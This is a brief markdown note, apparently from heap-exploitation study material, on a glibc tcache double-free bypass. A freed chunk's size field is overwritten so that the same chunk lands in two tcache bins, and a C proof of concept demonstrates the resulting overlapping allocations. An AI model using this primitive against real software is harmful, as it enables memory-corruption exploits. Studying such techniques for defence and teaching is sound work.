## tcache size double

**Purpose**: The ability to put 1 chunk to different tcache bin size.

**Details**: Since the tcache double free check only check the `tcache key`, and this check only check for the same size bin!

## PoC

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    long *ptr = malloc(0x78);

    free(ptr); // put ptr into tcache

    /* VULN HERE */
    ptr[-1] = 0x21; // Change the size of the chunk
    free(ptr); // double free the same chunk
    /* VULN HERE */

    // Now tcache has two chunks 0x80 and 0x20 with the same address

    long *a = malloc(0x18); // get the 0x20 chunk
    long *b = malloc(0x78); // get the 0x78 chunk

    printf("a: %p\n", a);
    printf("b: %p\n", b);

    return 0;
}
```
